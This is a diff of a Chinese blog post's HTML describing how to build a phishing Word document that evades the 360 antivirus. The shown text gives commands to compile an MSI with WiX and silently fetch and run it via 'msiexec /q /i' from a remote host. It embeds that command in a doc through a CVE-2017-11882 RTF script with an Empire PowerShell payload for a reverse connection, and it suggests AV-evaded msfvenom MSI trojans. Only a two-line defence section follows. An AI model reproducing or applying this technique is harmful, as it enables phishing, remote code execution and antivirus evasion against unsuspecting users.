@@ -3,13 +3,13 @@
   <head>
     <meta charset="utf-8" >
 
-<title>绕过360进行Word文档钓鱼 | Mari0er&#39;s Blog -</title>
+<title>绕过360进行Word文档钓鱼 | Mari0er&#39;s Blog</title>
 <meta name="description" content="">
 
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 
 <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
-<link rel="shortcut icon" href="https://mari0er.github.io/favicon.ico?v=1565688135525">
+<link rel="shortcut icon" href="https://mari0er.github.io/favicon.ico?v=1565699410997">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
 <link rel="stylesheet" href="https://mari0er.github.io/styles/main.css">
 
@@ -30,8 +30,8 @@
   <div class="top-container" data-aos="fade-right">
     <div class="top-header-container">
       <a class="site-title-container" href="https://mari0er.github.io">
-        <img src="https://mari0er.github.io/images/avatar.png?v=1565688135525" class="site-logo">
-        <h1 class="site-title">Mari0er&#39;s Blog -</h1>
+        <img src="https://mari0er.github.io/images/avatar.png?v=1565699410997" class="site-logo">
+        <h1 class="site-title">Mari0er&#39;s Blog</h1>
       </a>
       <div class="menu-btn" @click="menuVisible = !menuVisible">
         <div class="line"></div>
@@ -109,22 +109,23 @@
 <p>  上述代码很简单，在没有杀软的情况下用Office软件打开Doc文件可以完美弹出计算器，但是在有360的情况下，纳尼？？直接报毒！好吧，毕竟360！于是，尝试其他命令执行漏洞的方法。例如之前常用的的powershell,mshta,regsvr32,这些方法都不会报毒，但是会有弹窗提示用户有风险程序需要运行，很明显一般人都会点击阻止程序运行，谁会点击允许啊？神经病啊！！！<br>
 <img src="https://raw.githubusercontent.com/mari0er/picture/master/0202/0201_cmd.png" alt=""></p>
 <h2 id="0x02">0x02</h2>
-<p>  没办法，只能去寻找不触发弹窗并且最好是Windows自带的程序。Google了半天，最终找到了一个好方法,参考链接请点击<a href="https://baijiahao.baidu.com/s?id=1586899175661391940&amp;wfr=spider&amp;for=pc">这里</a>，利用Windows系统自带的msiexec程序下载并远程运行msi文件，以达到执行特定命令的目的。为了方便阅读，Wix工具下载请点击<a href="https://archive.codeplex.com/?p=wix">这里</a>,wix文件模板下载请点击<a href="https://github.com/mari0er/picture/blob/master/0202/calc.wix">这里</a>。安装完Wix工具后执行下列前两条命令，会在同目录下生成一个calc.msi文件，最后一条命令表示远程下载并利用msiexec运行calc.msi文件。这里解释下参数的意义:　<strong>/q</strong> --以安静模式运行　<strong>/i</strong> --官方解释是状态消息，不加的话会弹出Windows Installer框引起怀疑</p>
+<p>  没办法，只能去寻找不触发弹窗并且最好是Windows自带的程序。Google了半天，最终找到了一个好方法,参考链接请点击<a href="https://baijiahao.baidu.com/s?id=1586899175661391940&amp;wfr=spider&amp;for=pc">这里</a>，利用Windows系统自带的msiexec程序下载并远程运行msi文件，以达到执行特定命令的目的。为了方便阅读，Wix工具下载请点击<a href="https://archive.codeplex.com/?p=wix">这里</a>,wix文件模板下载请点击<a href="https://github.com/mari0er/picture/blob/master/0202/calc.wix">这里</a>。安装完Wix工具后执行下列前两条命令，会在同目录下生成一个calc.msi文件，最后一条命令表示远程下载并利用msiexec运行calc.msi文件。<br>
+<strong>这里解释下参数的意义</strong>:　<strong>/q</strong> --以安静模式运行　<strong>/i</strong> --官方解释是状态消息，不加的话会弹出Windows Installer框引起怀疑</p>
 <pre><code>C:\Program Files (x86)\WiX Toolset v3.10\bin&gt;candle.exe calc.wix
 C:\Program Files (x86)\WiX Toolset v3.10\bin&gt;light.exe calc.wixobj
 C:\Program Files (x86)\WiX Toolset v3.10\bin&gt;msiexec /q /i http://192.168.10.18/calc.msi
 </code></pre>
 <p><strong>注意</strong>：Cmd需要以管理员身份运行，利用模板文件默认打开电脑计算器，若要执行其他命令请自行修改模板文件的第15行</p>
 <h2 id="0x03">0x03</h2>
-<p>  下面使用empire和上述的方法制作一份钓鱼文档。首先配置好empire，将生成的代码复制粘贴到wix模板的第15行，替换之前打开计算器的代码，然后,用上述方法制作成msi文件，最后利用RTF脚本生成doc文件。</p>
+<p>  下面使用empire和上述的方法制作一份钓鱼文档。首先配置好empire，具体的配置内容可以参考<a href="https://mari0er.github.io/post/empire.html">这篇文章</a>,之后将生成的powershell代码复制粘贴到wix模板的第15行，替换之前打开计算器的代码，然后,用第二步的方法制作成msi文件，最后利用RTF脚本生成doc文件。此时打开Word文档就会远程执行下载和安装msi木马的命令，进一步运行powershell进行反弹。</p>
 <pre><code>python RTF_11882_0802.py -c &quot;msiexec /q /i http://192.168.10.18/calc.msi&quot; -o test.doc -i test.rtf
 </code></pre>
 <p><img src="https://raw.githubusercontent.com/mari0er/picture/master/0202/0202_empire.png" alt="empire"></p>
 <h2 id="0x04">0x04</h2>
-<p>  看到这里有人可能要问：为什么非要先调用msi文件再间接调用powershell呢？直接把执行命令通过RTF脚本写到文档里不是更方便吗？这里说一下，经过我的测试发现，直接利用RTF脚本运行命令，在360存在的情况下一定会弹窗，但通过msi安装文件却不会，其次RTF脚本  <strong>-c</strong>  参数有109字节数限制。其实还有很多其他的利用方法，比如利用msiexec直接下载并运行msfvenom制作的msi回弹文件，可以获得meterpreter回话。但是，需要提前对msi回弹文件进行免杀处理哦。<br>
+<p>  看到这里有人可能要问：为什么非要先调用msi文件再间接调用powershell呢？直接把执行命令通过RTF脚本写到文档里不是更方便吗？这里说一下，经过我的测试发现，直接利用RTF脚本运行命令，在360存在的情况下一定会弹窗，但通过msi安装文件却不会，其次RTF脚本  <strong>-c</strong>  参数有109字节数限制。其实还有很多其他的利用方法，比如利用msiexec直接下载并运行msfvenom制作的msi木马文件，可以直接获得meterpreter会话。但是，需要提前对msi木马文件进行免杀处理。<br>
 <img src="https://raw.githubusercontent.com/mari0er/picture/master/0202/0203_gif.gif" alt=""></p>
 <h2 id="0x05">0x05</h2>
-<p>防护方法：1.及时打上微软推出的补丁 2.不要随意下载网上的文档，更不要随意打开。</p>
+<p>防护方法：1.及时打上微软推出的补丁 2.不要随意下载未知邮件里的文档，更不要随意打开并查看文档内容。</p>
 <blockquote>
 <p>本文作者： Mari0er<br>
 本文链接： https://mari0er.github.io/post/fishing.html<br>
